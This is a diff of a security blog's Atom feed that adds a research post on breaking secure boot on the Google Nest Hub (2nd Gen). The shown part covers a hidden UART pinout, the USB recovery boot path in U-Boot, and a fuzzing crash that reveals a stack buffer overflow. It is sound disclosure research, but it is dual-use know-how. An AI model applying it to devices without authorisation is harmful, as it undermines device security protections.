@@ -1,5 +1,489 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>fred's notes</title><link href="https://fredericb.info/" rel="alternate"></link><link href="https://fredericb.info/feeds/all.atom.xml" rel="self"></link><id>https://fredericb.info/</id><updated>2021-11-29T00:00:00-08:00</updated><subtitle>Security &amp; Stuff</subtitle><entry><title>Booting Ubuntu on Google Chromecast With Google TV</title><link href="https://fredericb.info/2021/11/booting-ubuntu-on-google-chromecast-with-google-tv.html" rel="alternate"></link><published>2021-11-29T00:00:00-08:00</published><updated>2021-11-29T00:00:00-08:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2021-11-29:/2021/11/booting-ubuntu-on-google-chromecast-with-google-tv.html</id><summary type="html">&lt;p&gt;In a previous post, we detailed &lt;a href="https://fredericb.info/2021/02/amlogic-usbdl-unsigned-code-loader-for-amlogic-bootrom.html"&gt;a vulnerability in the Amlogic System-On-Chip bootROM&lt;/a&gt; that allows arbitrary code execution at EL3.
+<feed xmlns="http://www.w3.org/2005/Atom"><title>fred's notes</title><link href="https://fredericb.info/" rel="alternate"></link><link href="https://fredericb.info/feeds/all.atom.xml" rel="self"></link><id>https://fredericb.info/</id><updated>2022-06-15T00:00:00-07:00</updated><subtitle>Security &amp; Stuff</subtitle><entry><title>Breaking Secure Boot on Google Nest Hub (2nd Gen) to run Ubuntu</title><link href="https://fredericb.info/2022/06/breaking-secure-boot-on-google-nest-hub-2nd-gen-to-run-ubuntu.html" rel="alternate"></link><published>2022-06-15T00:00:00-07:00</published><updated>2022-06-15T00:00:00-07:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2022-06-15:/2022/06/breaking-secure-boot-on-google-nest-hub-2nd-gen-to-run-ubuntu.html</id><summary type="html">&lt;p&gt;In this post, we attack the Nest Hub (2nd Gen), an always-connected smart home display from Google, in order to boot a custom OS.&lt;/p&gt;
+&lt;p&gt;First, we explore both hardware and software attack surface in search of security vulnerabilities that could permit arbitrary code execution on the device.&lt;/p&gt;
+&lt;p&gt;Then, using a …&lt;/p&gt;</summary><content type="html">&lt;p&gt;In this post, we attack the Nest Hub (2nd Gen), an always-connected smart home display from Google, in order to boot a custom OS.&lt;/p&gt;
+&lt;p&gt;First, we explore both hardware and software attack surface in search of security vulnerabilities that could permit arbitrary code execution on the device.&lt;/p&gt;
+&lt;p&gt;Then, using a &lt;a href="https://www.raspberrypi.com/products/raspberry-pi-pico/"&gt;Raspberry Pi Pico microcontroller&lt;/a&gt;, we exploit an USB bug in the bootloader to break the secure boot chain.&lt;/p&gt;
+&lt;p&gt;Finally, we build new bootloader and kernel images to boot a custom OS from an external flash drive.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Booting Ubuntu on Google Nest Hub (2nd Gen) using CHIPICOPWN" src="https://fredericb.info/blog/elaine/chipicopwn.gif" style="display: block;margin-left: auto;margin-right: auto;"&gt;&lt;/p&gt;
+&lt;h1&gt;Disclaimer&lt;/h1&gt;
+&lt;p&gt;You are solely responsible for any damage caused to your hardware/software/keys/DRM licences/warranty/data/cat/etc...&lt;/p&gt;
+&lt;h1&gt;1. Hardware exploration&lt;/h1&gt;
+&lt;h2&gt;Virtual tour&lt;/h2&gt;
+&lt;p&gt;Overviews of internal hardware published on &lt;a href="https://fccid.io/A4RGUIK2/Internal-Photos/Internal-Photos-20200702-v1-Internal-Photos-5035937"&gt;FFC ID website&lt;/a&gt; and &lt;a href="https://electronics360.globalspec.com/article/17053/teardown-google-nest-hub-2nd-gen"&gt;Electronics360&lt;/a&gt; indicate the device is based on Amlogic S905D3G SoC.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="External photo from FCC.IO" src="https://fredericb.info/blog/elaine/elaine.usb.port.png" style="display: block;margin-left: auto;margin-right: auto;" width="800px"&gt;&lt;/p&gt;
+&lt;p&gt;They also reveal the existence of one USB port hidden underneath the device. Not a feature for users, so a priority for us. Especially since we already &lt;a href="https://fredericb.info/2021/02/amlogic-usbdl-unsigned-code-loader-for-amlogic-bootrom.html"&gt;discovered and exploited an USB vulnerability in the same chipset&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Good enough, let's buy one. The oldest one, always... Conveniently, manufacturing date is on box : December 2020.&lt;/p&gt;
+&lt;h2&gt;Nice try but no&lt;/h2&gt;
+&lt;p&gt;The first thing to check once we have the device in hands is if the &lt;a href="https://fredericb.info/2021/02/amlogic-usbdl-unsigned-code-loader-for-amlogic-bootrom.html"&gt;known USB vulnerability&lt;/a&gt; has been fixed. Doing so requires to boot the SoC in USB Download mode by holding a combination of buttons. After trying few random combinations, a new USB device is detected by our host, which indicates we found the right combination : Volume UP + Volume DOWN. We can then try to use the exploitation tool &lt;a href="https://github.com/frederic/amlogic-usbdl"&gt;amlogic-usbdl&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Unfortunately (for us), the tool detects that the device is password-protected, so we can't exploit this bug.&lt;/p&gt;
+&lt;p&gt;However, while attempting to trigger USB Download mode, we noticed few other button combinations that prevent the device to fully boot (stuck on boot logo).
+We keep that in mind since a boot flow change can also mean attack surface change.&lt;/p&gt;
+&lt;h2&gt;Mysterious wires&lt;/h2&gt;
+&lt;p&gt;After looking closely at the USB port, we notice that both USB and power supply connectors are on a separate module, which is connected to the main board via a 16-pin &lt;a href="https://en.wikipedia.org/wiki/Flexible_flat_cable"&gt;Flexible Flat Cable (FFC)&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="USB/DC board" src="https://fredericb.info/blog/elaine/elaine.USB-DC.board.png" style="display: block;margin-left: auto;margin-right: auto;" width="800px"&gt;&lt;/p&gt;
+&lt;p&gt;That's a lot of wires for only one micro-USB 2.0 (5 pins) &amp;amp; one power supply (2 pins).&lt;/p&gt;
+&lt;p&gt;Such flat cable, accessible without dissassembly and offering extra wires (apparently) unused, evokes a hidden cability to connect a &lt;em&gt;developer&lt;/em&gt; board with additionnal interfaces (UART ? JTAG ? SDCARD ?) for development or repair purposes.&lt;/p&gt;
+&lt;p&gt;In order to uncover potential other interfaces, we first identify the pins associated with USB and power supply using a multimeter :&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Power supply connector to FFC : 11 pins! ouch...&lt;/li&gt;
+&lt;li&gt;USB connector to FFC : 3 pins (No USB +5V)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;With 14 pins identified, only 2 are left.&lt;/p&gt;
+&lt;p&gt;The voltage measured on these 2 pins during boot is constant near-0V for the first one, and fluctuating between 0V and 3.3V for the second. This pattern matches an UART port.&lt;/p&gt;
+&lt;p&gt;We now have the complete pinout of the flexible flat cable :&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;PIN&lt;/th&gt;
+&lt;th&gt;FUNCTION&lt;/th&gt;
+&lt;th&gt;PIN&lt;/th&gt;
+&lt;th&gt;FUNCTION&lt;/th&gt;
+&lt;th&gt;PIN&lt;/th&gt;
+&lt;th&gt;FUNCTION&lt;/th&gt;
+&lt;th&gt;PIN&lt;/th&gt;
+&lt;th&gt;FUNCTION&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;1&lt;/td&gt;
+&lt;td&gt;GND&lt;/td&gt;
+&lt;td&gt;5&lt;/td&gt;
+&lt;td&gt;GND&lt;/td&gt;
+&lt;td&gt;9&lt;/td&gt;
+&lt;td&gt;VCC&lt;/td&gt;
+&lt;td&gt;13&lt;/td&gt;
+&lt;td&gt;USB-D-&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;2&lt;/td&gt;
+&lt;td&gt;GND&lt;/td&gt;
+&lt;td&gt;6&lt;/td&gt;
+&lt;td&gt;VCC&lt;/td&gt;
+&lt;td&gt;10&lt;/td&gt;
+&lt;td&gt;VCC&lt;/td&gt;
+&lt;td&gt;14&lt;/td&gt;
+&lt;td&gt;USB-D+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;3&lt;/td&gt;
+&lt;td&gt;UART-TX&lt;/td&gt;
+&lt;td&gt;7&lt;/td&gt;
+&lt;td&gt;VCC&lt;/td&gt;
+&lt;td&gt;11&lt;/td&gt;
+&lt;td&gt;VCC&lt;/td&gt;
+&lt;td&gt;15&lt;/td&gt;
+&lt;td&gt;GND&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;4&lt;/td&gt;
+&lt;td&gt;UART-RX&lt;/td&gt;
+&lt;td&gt;8&lt;/td&gt;
+&lt;td&gt;VCC&lt;/td&gt;
+&lt;td&gt;12&lt;/td&gt;
+&lt;td&gt;GND&lt;/td&gt;
+&lt;td&gt;16&lt;/td&gt;
+&lt;td&gt;USB-ID&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2&gt;DIY debug board&lt;/h2&gt;
+&lt;p&gt;We take advantage of the accessible FFC to connect a breakout board with the right FCC connector : 16-pin, 0.5mm pitch.&lt;/p&gt;
+&lt;p&gt;Several options exist:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Presoldered &lt;a href="https://www.aliexpress.com/item/32923333053.html"&gt;16-pin 0.5mm FFC board&lt;/a&gt; : hard to find except in China.&lt;/li&gt;
+&lt;li&gt;Presoldered 0.5mm FFC board with more pins (i.e &lt;a href="https://smile.amazon.com/gp/product/B07RWMSVNH"&gt;24-pin&lt;/a&gt;) : very dangerous if connections are shifted.&lt;/li&gt;
+&lt;li&gt;Solder the &lt;a href="https://www.digikey.com/en/products/detail/molex/0528921633/4444660"&gt;right connector&lt;/a&gt; on a &lt;a href="https://tinkersphere.com/cables-wires/3643-16-pin-05mm-1mm-pitch-fpc-to-dip-breakout.html"&gt;breakout board&lt;/a&gt; : the solution we opted for.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img alt="16 Pin 0.5mm &amp;amp; 1mm pitch FPC to DIP Breakout" src="https://fredericb.info/blog/elaine/board.FPC.16P_0.5mm.png" style="display: block;margin-left: auto;margin-right: auto;" width="800px"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="DIY debug board for Google Nest Hub" src="https://fredericb.info/blog/elaine/elaine.debug.board.png" style="display: block;margin-left: auto;margin-right: auto;" width="800px"&gt;&lt;/p&gt;
+&lt;p&gt;This board provides a convenient access to UART, USB and power supply.&lt;/p&gt;
+&lt;h2&gt;UART port&lt;/h2&gt;
+&lt;p&gt;Using our debug board, we connect an USB-to-Serial adapter to the UART port to obtain logs during boot :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;SM1:BL:511f6b:81ca2f&lt;span class="p"&gt;;&lt;/span&gt;FEAT:A28821B2:202B3000&lt;span class="p"&gt;;&lt;/span&gt;POC:F&lt;span class="p"&gt;;&lt;/span&gt;EMMC:0&lt;span class="p"&gt;;&lt;/span&gt;READ:0&lt;span class="p"&gt;;&lt;/span&gt;CHK:1F&lt;span class="p"&gt;;&lt;/span&gt;READ:0&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.0&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.0&lt;span class="p"&gt;;&lt;/span&gt;CHK:0&lt;span class="p"&gt;;&lt;/span&gt;
+bl2_stage_init 0x01
+&lt;span class="o"&gt;[&lt;/span&gt;...&lt;span class="o"&gt;]&lt;/span&gt;
+BL2 Built : &lt;span class="m"&gt;20&lt;/span&gt;:46:51, Dec &lt;span class="m"&gt;10&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt;. &lt;span class="se"&gt;\n&lt;/span&gt;g12a g3d61890 - user@host
+&lt;span class="o"&gt;[&lt;/span&gt;...&lt;span class="o"&gt;]&lt;/span&gt;
+U-Boot &lt;span class="m"&gt;2019&lt;/span&gt;.01-gbfc19012ea-dirty &lt;span class="o"&gt;(&lt;/span&gt;Dec &lt;span class="m"&gt;11&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; - &lt;span class="m"&gt;04&lt;/span&gt;:19:32 &lt;span class="o"&gt;)&lt;/span&gt;
+
+DRAM:  &lt;span class="m"&gt;2&lt;/span&gt; GiB
+board init
+&lt;span class="o"&gt;[&lt;/span&gt;...&lt;span class="o"&gt;]&lt;/span&gt;
+MUTE engaged
+VOL_UP not pressed
+upgrade key not pressed
+reboot_mode:cold_boot
+cold_boot
+aml log : boot from nand or emmc
+Kernel decrypted
+kernel verify: success
+&lt;span class="o"&gt;[&lt;/span&gt;...&lt;span class="o"&gt;]&lt;/span&gt;
+Starting kernel ...
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We can see bootloader and U-Boot logs, kernel image seems encrypted, but 
+no more logs once Linux has started though.&lt;/p&gt;
+&lt;p&gt;We also see that button states are checked ("MUTE engaged", "VOL_UP not pressed"), and that "upgrade key not pressed".
+This is really intriguing since any new feature we discover could represent a new attack surface.&lt;/p&gt;
+&lt;p&gt;We try to boot again, this time while holding both volume buttons (volume down &amp;amp; volume up) :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;...&lt;span class="o"&gt;]&lt;/span&gt;
+U-Boot &lt;span class="m"&gt;2019&lt;/span&gt;.01-gbfc19012ea-dirty &lt;span class="o"&gt;(&lt;/span&gt;Dec &lt;span class="m"&gt;11&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; - &lt;span class="m"&gt;04&lt;/span&gt;:19:32 &lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="o"&gt;[&lt;/span&gt;...&lt;span class="o"&gt;]&lt;/span&gt;
+MUTE engaged
+VOL_UP pressed
+VOL_DN pressed
+detect VOL_UP pressed
+VOL_DN pressed
+resetting USB...
+USB0:   Register &lt;span class="m"&gt;3000140&lt;/span&gt; NbrPorts &lt;span class="m"&gt;2&lt;/span&gt;
+Starting the controller
+USB XHCI &lt;span class="m"&gt;1&lt;/span&gt;.10
+scanning bus &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; devices... &lt;span class="m"&gt;3&lt;/span&gt; USB Device&lt;span class="o"&gt;(&lt;/span&gt;s&lt;span class="o"&gt;)&lt;/span&gt; found
+       scanning usb &lt;span class="k"&gt;for&lt;/span&gt; storage devices... &lt;span class="m"&gt;2&lt;/span&gt; Storage Device&lt;span class="o"&gt;(&lt;/span&gt;s&lt;span class="o"&gt;)&lt;/span&gt; found
+** Unable to &lt;span class="nb"&gt;read&lt;/span&gt; file recovery.img **
+resetting USB...
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;When booted this way, the Nest Hub tries to load a file named &lt;em&gt;recovery.img&lt;/em&gt; from an USB flash drive. Attack surface just increased.&lt;/p&gt;
+&lt;h1&gt;2. Software exploration&lt;/h1&gt;
+&lt;p&gt;While official firmware images for Nest Hub are not publicly available, the &lt;a href="https://drive.google.com/file/d/1euEvmbInWddUFAhMhHe628WAnpdYpGIa/view?usp=sharing"&gt;source code for the bootloader (U-Boot) and the kernel (Linux) has been released by Google&lt;/a&gt; thanks to the GPL license.&lt;/p&gt;
+&lt;h2&gt;Mysterious USB recovery feature&lt;/h2&gt;
+&lt;p&gt;We start by investigating the recovery mechanism we spotted earlier as it happens to be interesting for several reasons:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Implemented in U-Boot so open source : easy to study.&lt;/li&gt;
+&lt;li&gt;Apparently meant to run a recovery boot image : exactly what we want to achieve, but is it signed ?&lt;/li&gt;
+&lt;li&gt;A lot of code involved : USB, Mass Storage device, partition table, filesystem, boot image parsing, boot image signature verification (if any). Bugs in these layers could lead to arbitrary code execution.&lt;/li&gt;
+&lt;li&gt;Data is loaded from external USB source : no need to disassemble the device.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;To quickly locate this feature in U-Boot source tree, we grep &lt;em&gt;recovery.img&lt;/em&gt;. We find a function named &lt;strong&gt;recovery_from_udisk&lt;/strong&gt; in U-Boot environment :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;recovery_from_udisk=&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
+       &lt;span class="s2"&gt;&amp;quot;while true ;do &amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
+              &lt;span class="s2"&gt;&amp;quot;usb reset; &amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
+              &lt;span class="s2"&gt;&amp;quot;if fatload usb 0 &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;loadaddr&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt; recovery.img; then &amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
+                     &lt;span class="s2"&gt;&amp;quot;bootm &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;loadaddr&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;;&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
+              &lt;span class="s2"&gt;&amp;quot;fi;&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
+       &lt;span class="s2"&gt;&amp;quot;done;&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
+       &lt;span class="s2"&gt;&amp;quot;\0&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;First, this code resets the USB subsystem. Then, it calls the &lt;strong&gt;fatload&lt;/strong&gt; function to load a boot image named &lt;em&gt;recovery.img&lt;/em&gt; in memory at address &lt;em&gt;loadaddr&lt;/em&gt;.
+Finally, it tries to boot the loaded data using function &lt;strong&gt;bootm&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;We can also confirm that function &lt;strong&gt;recovery_from_udisk&lt;/strong&gt; is run when both volume buttons are held  (GPIOZ_5 &amp;amp; GPIOZ_6) :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;upgrade_key=&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
+       &lt;span class="s2"&gt;&amp;quot;if gpio input GPIOZ_5; then &amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
+              &lt;span class="s2"&gt;&amp;quot;echo detect VOL_UP pressed;&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
+              &lt;span class="s2"&gt;&amp;quot;if gpio input GPIOZ_6; then &amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
+                     &lt;span class="s2"&gt;&amp;quot;echo VOL_DN pressed;&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
+                     &lt;span class="s2"&gt;&amp;quot;setenv boot_external_image 1;&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
+                     &lt;span class="s2"&gt;&amp;quot;run recovery_from_udisk;&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
+&lt;span class="o"&gt;[&lt;/span&gt;...&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;This recovery feature is an ideal mechanism to boot an alternative OS. However, a quick look at &lt;strong&gt;bootm&lt;/strong&gt; function reveals it systematically verifies &lt;em&gt;recovery.img&lt;/em&gt; signature by calling function &lt;strong&gt;aml_sec_boot_check&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;To boot a custom OS using this mechanism, we first have to find a bug that could bypass this verification.&lt;/p&gt;
+&lt;h2&gt;Bug hunt&lt;/h2&gt;
+&lt;p&gt;The recovery feature enables USB interface as an attack vector.
+As a result, any code that processes data coming from USB interface becomes a potential (software) attack surface.&lt;/p&gt;
+&lt;p&gt;This attack surface can be roughly estimated by exploring the call flow triggered by the recovery feature :&lt;/p&gt;
+&lt;p&gt;&lt;img alt="USB Mass Sstorage attack surface in U-Boot" src="https://fredericb.info/blog/elaine/uboot-cfg.png" style="display: block;margin-left: auto;margin-right: auto;" width="600px"&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;usb reset&lt;/strong&gt; exposes the USB driver when it performs USB enumeration.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;fatload&lt;/strong&gt; exposes several drivers : USB, Mass Storage, DOS partition, FAT filesystem.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;bootm&lt;/strong&gt; attack surface is very limited since it starts by calling the signature verification routine &lt;strong&gt;aml_sec_boot_check&lt;/strong&gt;, which cannot be reviewed because it's implemented in TrustZone (no source code or binary available at this moment).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The attack surface exposed by &lt;strong&gt;fatload&lt;/strong&gt; command is obviously the most interesting target due to the amount of code involved and its complexity.&lt;/p&gt;
+&lt;p&gt;While &lt;a href="https://forallsecure.com/blog/forallsecure-uncovers-critical-vulnerabilities-in-das-u-boot"&gt;previous research&lt;/a&gt; found issues in &lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13103"&gt;DOS partition parser&lt;/a&gt; and &lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13104"&gt;EXT4&lt;/a&gt; &lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13105"&gt;filesystem&lt;/a&gt; &lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13106"&gt;parser&lt;/a&gt;, we could not find public evidence of vulnerabilty research on U-Boot FAT filesystem, which makes it an ideal target to begin with.&lt;/p&gt;
+&lt;p&gt;U-Boot implements a &lt;em&gt;sandbox&lt;/em&gt; architecture that allows it to run as a Linux user-space application. This feature is a convenient starting point to build a fuzzer for U-Boot code.&lt;/p&gt;
+&lt;p&gt;We build a fuzzing harness that injects data in &lt;strong&gt;blk_dread&lt;/strong&gt; (function that reads data from a block device), and triggers execution by calling &lt;strong&gt;fat_read_file&lt;/strong&gt;. The harness must also initialize the state that is expected by these functions : USB enumeration done, block device detected, partitions have been parsed (in real conditions, this initialization would have been performed by &lt;strong&gt;fs_set_blk_dev&lt;/strong&gt;). Fuzzing is performed by &lt;a href="https://github.com/google/AFL"&gt;AFL&lt;/a&gt; and &lt;a href="https://llvm.org/docs/LibFuzzer.html"&gt;libFuzzer&lt;/a&gt;.
+This first fuzzing attempt uncovered few &lt;a href="https://en.wikipedia.org/wiki/Circular_reference"&gt;circular reference&lt;/a&gt; issues in FAT cluster chains that caused the code to loop indefinitely. While being painful to fix, they're not the kind of bugs we're looking for.&lt;/p&gt;
+&lt;p&gt;In a second phase, we extend the fuzzing to the initialized state since some parameters can be controlled by the attacker. For example, the USB Mass Storage driver sets &lt;a href="https://github.com/u-boot/u-boot/blob/28c2ebef372b4c9bb18bed8373e0d9e65a09b42b/common/usb_storage.c#L1421"&gt;multiple parameters&lt;/a&gt; in &lt;a href="https://github.com/u-boot/u-boot/blob/28c2ebef372b4c9bb18bed8373e0d9e65a09b42b/include/blk.h#L67"&gt;structure blk_desc&lt;/a&gt; that describe the detected block device in initialized state.&lt;/p&gt;
+&lt;p&gt;One of them is the block size (&lt;em&gt;blk_desc.blksz&lt;/em&gt;) of the block device (which is an USB flash drive in our case). This value is obtained from the block device by sending command &lt;a href="https://github.com/u-boot/u-boot/blob/28c2ebef372b4c9bb18bed8373e0d9e65a09b42b/common/usb_storage.c#L1051"&gt;READ CAPACITY&lt;/a&gt;, which means attacker controls it.&lt;/p&gt;
+&lt;p&gt;Block size is an important parameter for upper layers like partition and filesystem drivers. Messing with it led to an interesting crash :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;fuzz&lt;/span&gt;
+&lt;span class="nl"&gt;INFO&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nl"&gt;Seed&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;473398954&lt;/span&gt;
+&lt;span class="nl"&gt;INFO&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Loaded&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="n"&gt;modules&lt;/span&gt;   &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1402&lt;/span&gt; &lt;span class="kr"&gt;inline&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;bit&lt;/span&gt; &lt;span class="n"&gt;counters&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;1402&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x5aa0c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x5aa63a&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; 
+&lt;span class="nl"&gt;INFO&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Loaded&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="n"&gt;PC&lt;/span&gt; &lt;span class="n"&gt;tables&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1402&lt;/span&gt; &lt;span class="n"&gt;PCs&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;1402&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x57ada0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mh"&gt;0x580540&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; 
+&lt;span class="o"&gt;=================================================================&lt;/span&gt;
+&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;5892&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="nl"&gt;ERROR&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nl"&gt;AddressSanitizer&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;stack&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;overflow&lt;/span&gt; &lt;span class="n"&gt;on&lt;/span&gt; &lt;span class="n"&gt;address&lt;/span&gt; &lt;span class="mh"&gt;0x7ffe6db4bb3f&lt;/span&gt; &lt;span class="n"&gt;at&lt;/span&gt; &lt;span class="n"&gt;pc&lt;/span&gt; &lt;span class="mh"&gt;0x0000004f16af&lt;/span&gt; &lt;span class="n"&gt;bp&lt;/span&gt; &lt;span class="mh"&gt;0x7ffe6db4b790&lt;/span&gt; &lt;span class="n"&gt;sp&lt;/span&gt; &lt;span class="mh"&gt;0x7ffe6db4af40&lt;/span&gt;
+&lt;span class="n"&gt;WRITE&lt;/span&gt; &lt;span class="n"&gt;of&lt;/span&gt; &lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="mi"&gt;32768&lt;/span&gt; &lt;span class="n"&gt;at&lt;/span&gt; &lt;span class="mh"&gt;0x7ffe6db4bb3f&lt;/span&gt; &lt;span class="kr"&gt;thread&lt;/span&gt; &lt;span class="n"&gt;T0&lt;/span&gt;
+    &lt;span class="cp"&gt;#0 0x4f16ae in __asan_memset (/u-boot-elaine/fuzzer/fuzz+0x4f16ae)&lt;/span&gt;
+    &lt;span class="cp"&gt;#1 0x55a8cf in blk_dread /u-boot-elaine/fuzzer/blk.c:153:13&lt;/span&gt;
+    &lt;span class="cp"&gt;#2 0x5284b1 in part_test_dos /u-boot-elaine/disk/part_dos.c:96:6&lt;/span&gt;
+    &lt;span class="cp"&gt;#3 0x521f52 in part_init /u-boot-elaine/disk/part.c:242:9&lt;/span&gt;
+    &lt;span class="cp"&gt;#4 0x55b494 in usb_stor_probe_device /u-boot-elaine/fuzzer/usb_storage.c:41:5&lt;/span&gt;
+    &lt;span class="cp"&gt;#5 0x55b648 in LLVMFuzzerTestOneInput /u-boot-elaine/fuzzer/fuzz.c:42:5&lt;/span&gt;
+    &lt;span class="cp"&gt;#6 0x42ee1a in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/u-boot-elaine/fuzzer/fuzz+0x42ee1a)&lt;/span&gt;
